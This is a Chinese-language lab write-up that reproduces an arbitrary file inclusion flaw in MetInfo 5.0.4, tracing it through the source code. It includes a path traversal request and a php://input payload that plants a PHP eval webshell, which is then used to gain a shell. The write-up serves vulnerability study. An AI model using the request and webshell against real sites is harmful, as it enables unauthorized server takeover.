# metinfo 5.0.4 任意文件包含



## 漏洞描述

MetInfo 是一套使用PHP 和MySQL 开发的内容管理系统。 MetInfo 5.0.4 版本中存在一个任意文件包含漏洞，这个漏洞允许攻击者通过构造特定的请求参数来包含并执行服务器上的任意文件。具体来说，MetInfo 5.0.4 的模板引擎在解析模板文件时，没有对用户输入的文件路径进行严格的过滤和校验，导致攻击者可以通过构造特殊的文件路径参数，来读取、包含甚至执行服务器上的任意文件。这可能导致敏感信息泄露，或者使得服务器被完全控制。



## 影响版本

metinfo 5.0.4 



## 漏洞复现

采用 Windows Server2022 作为目标机

采用Kali Linux为攻击机

采用 phpStudy 2016 + metinfo 5.0.4 为环境





## 漏洞验证

> **代码审计**

![image-20240409201249192](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409201249192.png)

可以看到，`/metinfo_5.0.4/about/index.php`源码中，既包含了 `/metinfo_5.0.4/include/module.php` 文件，而且动态包含了` $module`，而 `$module `并未在本页面定义，我们可以追进`/metinfo_5.0.4/include/module.php`文件一探究竟

![image-20240409202807559](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409202807559.png)

在本`module.php`源码中，我们可以看到，`$module` 在` module.php ` 中首次出现在判断执行的语句内，当变量 `$fondule`不为 7 时，对` $module` 进行赋值操作。又由`index.php`源码知，`$fondule`已经被赋值为1，所以在包含`module.php`时，会触发该判断语句。

---

那么此时，我们需要思考一个问题，该如何改变 `$fmodule` 的值，使其为7不进入该判断语句，使得`module`不被初始化呢？

我们来到被`module.php`头部被动态包含的`common.inc.php`源码中

![image-20240409202149935](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409202149935.png)

可以看到，圈住的是`index.php`最终接收传参代码位置。这段代码的目的是对`$_COOKIE`、`$_POST`和`$_GET`这三个超全局变量数组中不以`'_'`开头的键值对进行特殊处理，并将处理后的值存储为对应的变量。

```
对请求的处理方法大致如下:
&module=c:/windows/system32/drivers/etc/hosts
    |                      |
$module =                  值
```

由源码分析可知，当传入参数 `$fmodule` 等于 7 时，不会对` $module` 进行初始化，此时传入参数为变量 `$module` 进行赋值即可实现文件包含。

> **构造请求进行尝试**

```
/MetInfo5.0.4/about/index.php?fmodule=7&module=../../../phpinfo.php
```

![image-20240409205554400](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409205554400.png)

可以看到成功访问phpinfo.php文件，故漏洞存在；

---



## 漏洞利用

使用BP进行抓包，将请求转换为POST

![image-20240409212904941](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409212904941.png)

可以看到，BP抓包重放页可以达到目的；

接下来利用php://input 执行PHP 命令，创建一句话木马

```php
<?php file_put_contents('windows_system.php','<?php @eval($_REQUEST[cmd]) ?>');?>
```

![image-20240409220649226](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409220649226.png)

可以看到成功重放，接下来看看能不能访问

![image-20240409220744317](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409220744317.png)

可以访问，那么使用蚁剑进行连接

![image-20240409220934812](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409220934812.png)

可以看到连接成功

![image-20240409221024378](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409221024378.png)

成功获取shell；

---

